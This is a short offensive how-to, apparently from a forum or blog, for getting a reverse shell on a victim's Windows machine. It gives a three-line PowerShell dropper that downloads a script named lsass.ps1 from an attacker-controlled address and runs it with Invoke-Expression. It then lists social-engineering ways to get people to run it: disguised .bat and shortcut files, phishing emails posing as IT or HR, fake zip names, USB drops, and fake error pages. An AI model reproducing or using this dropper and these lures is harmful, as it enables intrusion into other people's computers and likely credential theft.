By runnning the fowlling dropper on the victim machine you can obtain a reverse shell that remains undetected!

$wc = New-Object System.Net.WebClient
$code = $wc.DownloadString("http://10.0.0.21/lsass.ps1")
Invoke-Expression $code 

Note - update the web address in the $code variable, and in the script itself. 

Here are a few ways you can have someone run the dropper:

📄 Batch File Wrapper

Wrap the PowerShell dropper in a .bat file and name it something like OpenMe.bat, ActivateLicense.bat, or FixErrors.bat.

🔁 Rename as a Shortcut File (.lnk)

Use a shortcut icon that looks like a folder or document, but the shortcut runs PowerShell silently.

📧 Email Attachment or Link

Send an email pretending to be IT, HR, or customer support:
“Run this tool to fix an issue with your account”

📦 Zip File Disguise

Place the .bat or .ps1 inside a .zip with names like Invoice_Tool.zip, GamePatch.zip, or Resume_Viewer.zip.

💾 USB Drop Attack

Leave a USB drive labeled "Photos", "Payroll Info", etc., with an autorun.bat or enticing file.

📝 Fake Error Message + Instructions

Social engineer the user into copy/pasting a PowerShell command into their terminal (e.g., from a fake webpage or chat support).

🖱️ Right-Click Instructions

Provide instructions like "Right click the file and choose 'Run with PowerShell'" to bypass .ps1 execution restrictions.
